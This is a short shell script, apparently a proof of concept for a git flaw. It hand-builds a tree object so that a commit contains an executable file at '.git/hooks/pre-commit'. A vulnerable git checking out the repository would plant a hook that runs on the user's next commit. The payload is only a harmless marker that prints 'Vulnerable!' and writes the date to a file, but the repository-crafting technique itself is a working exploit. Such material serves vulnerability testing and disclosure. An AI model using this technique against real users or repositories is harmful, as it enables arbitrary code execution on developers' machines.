#!/bin/sh
set -eu

readonly filename='.git/hooks/pre-commit'
readonly filemode=100755

emit_payload() {
    cat <<'EOF'
#!/bin/sh
printf 'Vulnerable!\n'
date >vulnerable
EOF
}

repo="$1"
git init -- "$repo"
cd -- "$repo"
branch="$(git symbolic-ref --short HEAD)"

blob_hash="$(emit_payload | git hash-object -w --stdin)"
escaped_blob_hash="$(printf '%s' "$blob_hash" | sed 's/../\\x&/g')"
tree_hash="$(
    printf '%s %s\0'"$escaped_blob_hash" "$filemode" "$filename" |
    git hash-object -t tree -w --stdin
)"
commit_hash="$(git commit-tree -m 'Initial commit' "$tree_hash")"
git branch -f -- "$branch" "$commit_hash"

git show
